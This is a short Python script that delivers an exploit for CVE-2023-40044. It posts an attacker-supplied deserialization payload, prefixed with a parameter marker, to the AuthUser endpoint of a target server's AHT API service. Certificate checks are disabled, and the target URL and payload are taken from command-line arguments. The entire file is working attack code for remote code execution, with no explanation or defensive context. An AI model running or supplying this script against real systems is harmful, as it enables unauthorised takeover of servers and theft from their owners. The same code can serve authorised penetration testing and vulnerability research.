import argparse
import requests
import urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_exploit_payload(url, deserialization_payload, verbose):
    #define the payload
    exploit_payload = f"::AHT_DEFAULT_UPLOAD_PARAMETER::{deserialization_payload}"
    print(exploit_payload)

    headers = {
        'Exploit': 'CVE-2023-40044',
        'Cookie': 'ASP.NET_SessionId=doesntmatter',
        'Access-Control-Allow-Origin': '*',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Ch-Ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"macOS"',
    }

    mp_encoder = MultipartEncoder(
        fields={
            '': exploit_payload,
        }
    )
    
    #proxy = {"https": "127.0.0.1:8080"}
    print(f"[*] Sending exploit payload to {url}/AHT/AhtApiService.asmx/AuthUser")
    response = requests.post(
        f"{url}/AHT/AhtApiService.asmx/AuthUser",
        headers={'Content-Type': mp_encoder.content_type},
        verify=False,
        #proxies=proxy,
        data=mp_encoder
    )


        # print the response
    print(f"[*] Response status code: {response.status_code}")
    if verbose:
        print(response.text)
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Send an exploit payload to a URL.")
    parser.add_argument('-u', '--url', help="URL to send the exploit payload to.", required=True)
    parser.add_argument('-p', '--payload', help="The deserialization payload to send.", required=True)
    parser.add_argument('-v', '--verbose', help="Print the response from the server.", action='store_true')
    
    args = parser.parse_args()

    send_exploit_payload(args.url, args.payload, args.verbose)
